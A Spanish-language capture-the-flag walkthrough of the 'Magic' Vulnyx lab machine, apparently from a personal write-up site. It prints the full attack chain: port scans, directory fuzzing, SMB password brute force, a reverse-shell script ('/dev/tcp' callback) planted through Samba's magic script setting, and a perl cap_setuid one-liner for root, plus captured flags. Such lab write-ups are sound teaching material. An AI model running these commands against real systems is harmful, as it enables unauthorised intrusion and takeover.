---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Magic Vulnyx (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-01 12:08 EDT
Nmap scan report for 192.168.5.93
Host is up (0.0021s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp  open  http        nginx 1.22.1
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.22.1
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
MAC Address: 08:00:27:61:0A:DE (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-09-01T16:08:49
|_  start_date: N/A
|_nbstat: NetBIOS name: MAGIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.22 seconds
```

Veremos varios puertos interesantes, entre ellos el puerto `SMB` y el puerto `80`, sabemos que en el `80` suele alojarse un servidor web, si entramos dentro del mismo veremos una pagina normal de `nginx` por defecto, nada interesante, por lo que vamos a realizar un poco de `fuzzing`.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.93/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/backup               (Status: 403) [Size: 153]
Progress: 35777 / 882244 (4.06%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 36005 / 882244 (4.08%)
===============================================================
Finished
===============================================================
```

No veremos gran cosa, pero aunque nos ponga un `Forbidden` en el directorio de `backup` vamos a probar a realizar un `fuzzing` dentro del mismo a ver que vemos.

```shell
gobuster dir -u http://<IP>/backup -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.93/backup
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/conf                 (Status: 403) [Size: 153]
Progress: 27986 / 882244 (3.17%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 28212 / 882244 (3.20%)
===============================================================
Finished
===============================================================
```

Veremos bastante interesante que nos muestra un recurso `/conf` esto ya va siendo interesante, por lo que vamos a realizar un poco mas de `fuzzing` en dicho directorio web, con la suerte de a ver si encontramos algun archivo de configuracion.

```shell
gobuster dir -u http://<IP>/backup/conf -w <WORDLIST> -x conf -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.93/backup/conf
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              conf
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/smb.conf             (Status: 200) [Size: 8799]
Progress: 32033 / 441122 (7.26%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 32188 / 441122 (7.30%)
===============================================================
Finished
===============================================================
```

Por lo que vemos hemos descubierto el archivo `smb.conf` que esta expuesto en la web, por lo que vamos a meternos a ver que vemos.

```
URL = http://<IP>/backup/conf/smb.conf
```

Info:

```
.............................<RESTO DE ARCHIVO>....................................

[tmp]
   comment = Temp Directory
   browseable = yes
   valid users = xerosec
   read only = no
   magic script = config.sh
   create mask = 0700
   directory mask = 0700
   path = /tmp/
```

Veremos estas lineas interesantes del archivo, nos esta mostrando de primeras un usuario llamado `xerosec` y despues un `magic script` con el archivo `config.sh`, pero nos vamos a centrar en el usuario, vamos a realizar `fuerza bruta` con dicho usuario para encontrar sus credenciales en `SMB`.

## NetExec

Antes de realizar la fuerza bruta, vamos a limpiar el `rockyou.txt` para que este formateado en `UTF-8` y no de errores con la herramienta.

```shell
iconv -f ISO-8859-1 -t UTF-8//TRANSLIT /<PATH>/rockyou.txt > rockyou_utf8.txt
```

Una vez echo esto, vamos a realizar la fuerza bruta.

```shell
netexec smb <IP> -u 'xerosec' -p rockyou_utf8.txt
```

Info:

```
............................<RESTO DE CODIGO>......................................
SMB         192.168.5.93    445    MAGIC            [+] MAGIC\xerosec:david1
```

Veremos que las ha encontrado, por lo que vamos a listar los recursos compartidos que tiene dicho usuario, que deberia de aparecer el `/tmp`.

```shell
smbclient -L //<IP>/ -U xerosec
```

Metemos como contraseña `david1`....

Info:

```
Password for [WORKGROUP\xerosec]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        tmp             Disk      Temp Directory
        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
```

Veremos que se listo de forma correcta y por lo que vemos, vemos el recurso `tmp`, vamos a conectarnos a el.

```shell
smbclient //<IP>/tmp -U xerosec
```

Metemos como contraseña `david1`...

```
Password for [WORKGROUP\xerosec]:
Try "help" to get a list of possible commands.
smb: \>
```

Y veremos que estaremos dentro, como antes vimos que estaba el `magic script` y si listamos no vemos el archivo `config.sh` vamos a crearnoslo nosotros para que se ejecute de forma automatica ya que es lo que hace esto.

> config.sh

```bash
#!/bin/bash

sh -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Lo guardamos y nos pondremos a la escucha.

```shell
nc -lvnp <PORT>
```

Ahora tendremos que subir el archivo al `SMB`:

```shell
put config.sh
```

Si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.93] 46076
sh: 0: can't access tty; job control turned off
$ whoami
xerosec
```

Vemos que ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Antes de nada vamos a leer la `flag` del usuario.

> user.txt

```
d14885ecd144685ad228d66e275d715e
```

## Escalate Privileges

Si listamos las `capabilities` que tenemos veremos lo siguiente:

```shell
getcap -r / 2>/dev/null
```

Info:

```
/usr/bin/perl5.36.0 cap_setuid=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/perl cap_setuid=ep
```

Vemos que tendremos `perl` que no suele ser comun, por lo que podremos realizar lo siguiente para ser `root`.

```shell
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

Info:

```
root@magic:/tmp# whoami
root
```

Con esto veremos que seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
8e90ffd47b5164f275c42955a2531eef
```
